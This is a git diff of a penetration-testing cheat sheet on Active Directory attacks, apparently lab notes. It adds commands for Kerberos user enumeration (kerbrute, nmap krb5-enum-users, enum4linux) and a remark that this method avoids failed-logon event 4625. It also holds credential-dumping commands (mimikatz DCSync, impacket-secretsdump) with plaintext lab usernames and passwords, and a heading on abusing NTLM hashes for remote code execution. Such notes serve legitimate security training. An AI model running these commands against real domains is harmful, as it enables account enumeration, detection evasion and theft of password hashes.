@@ -43,11 +43,13 @@ Active Directory User Enumeration
 ```
 Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt <IP>
 ```
-kerbrute = nxc ldap ip -u '' -p '' -k
+>kerbrute = nxc ldap ip -u '' -p '' -k  
+
+>This method doesn't generate Windows event ID 4625: An account failed to log on, but does generate event ID 4768: A Kerberos authentication ticket (TGT) was requested  
 ```
 ./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
 ```
-This method doesn't generate Windows event ID 4625: An account failed to log on, but does generate event ID 4768: A Kerberos authentication ticket (TGT) was requested
+
 ```
 enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
 ```
@@ -344,6 +346,11 @@ impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) 
 ```
 lsadump::dcsync /user:<user>
 kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
+impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
+
+NTDS.DIT Secrets and Kerberos Key:
+impacket-secretsdump 'htb.local'/'venom':'newP@ssword2022'@10.10.10.161
 ```
 
 #### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
